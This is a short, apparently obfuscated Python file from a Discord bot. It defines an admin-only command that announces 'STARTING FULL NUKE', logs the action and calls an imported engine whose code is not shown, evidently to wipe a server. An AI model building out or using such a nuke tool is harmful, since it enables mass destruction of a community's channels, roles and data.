import discord
import asyncio
import random
import time
from core.b._71 import _71
from core.b._73 import _73
from core.c._74 import _74

async def _1(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("ADMIN PERMISSION REQUIRED", delete_after=3)
        return
    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("BOT NEEDS ADMIN PERMISSION", delete_after=3)
        return
    await ctx.send("STARTING FULL NUKE", delete_after=2)
    _73(f"Nuke by {ctx.author} in {ctx.guild.name}")
    engine = _74(ctx.guild)
    await engine._75()
    _73("Nuke done")
